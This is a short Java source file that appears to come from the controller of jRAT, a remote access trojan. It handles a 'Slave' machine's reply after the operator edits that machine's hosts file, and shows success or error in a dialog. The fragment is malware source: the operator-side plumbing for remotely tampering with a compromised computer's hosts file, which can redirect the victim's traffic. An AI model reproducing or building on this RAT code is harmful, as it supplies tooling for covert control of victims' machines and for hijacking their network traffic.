package jrat.controller.packets.incoming;

import jrat.controller.Slave;
import jrat.controller.ui.frames.FrameControlPanel;
import jrat.controller.ui.panels.PanelControlHostsFile;

import javax.swing.*;


public class Packet39HostEditResult extends AbstractIncomingPacket {

	@Override
	public void read(Slave slave) throws Exception {
		String answer = slave.readLine();
		FrameControlPanel frame = FrameControlPanel.instances.get(slave);
		if (frame != null) {
			PanelControlHostsFile panel = (PanelControlHostsFile) frame.panels.get("hosts file");
			if (panel.waitingAnswer) {
				if (answer.startsWith("ERR: ")) {
					answer = answer.substring(5, answer.length());
					JOptionPane.showMessageDialog(null, "Failed writing hosts file:\n\n" + answer, "Error", JOptionPane.ERROR_MESSAGE);
				} else {
					JOptionPane.showMessageDialog(null, answer, "Hosts file", JOptionPane.INFORMATION_MESSAGE);
				}
				panel.waitingAnswer = false;
			}
		}
	}

}
